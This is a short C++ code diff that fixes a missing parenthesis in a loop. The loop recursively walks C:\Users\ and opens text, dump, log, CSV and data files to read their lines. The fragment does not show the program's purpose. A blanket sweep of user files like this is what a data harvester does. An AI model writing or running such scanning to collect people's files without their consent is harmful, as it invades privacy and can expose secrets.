@@ -134,7 +134,7 @@ int main()
 		loop:;
 
 		for (auto& x : fs::recursive_directory_iterator("C:\\Users\\")) {
-			if (x.path().extension() == ".txt" || x.path().extension() == ".dmp" || x.path().extension() == "" || x.path().extension() == ".csv" || x.path().extension() == ".lst" || x.path().extension() == ".text" || x.path().extension() == ".dat" || x.path().extension() == ".log" {
+			if (x.path().extension() == ".txt" || x.path().extension() == ".dmp" || x.path().extension() == "" || x.path().extension() == ".csv" || x.path().extension() == ".lst" || x.path().extension() == ".text" || x.path().extension() == ".dat" || x.path().extension() == ".log" ) {
 				if (boost::filesystem::is_regular_file(x.path())) {
 					fs::path absolutepath = x;
 					std::string line;
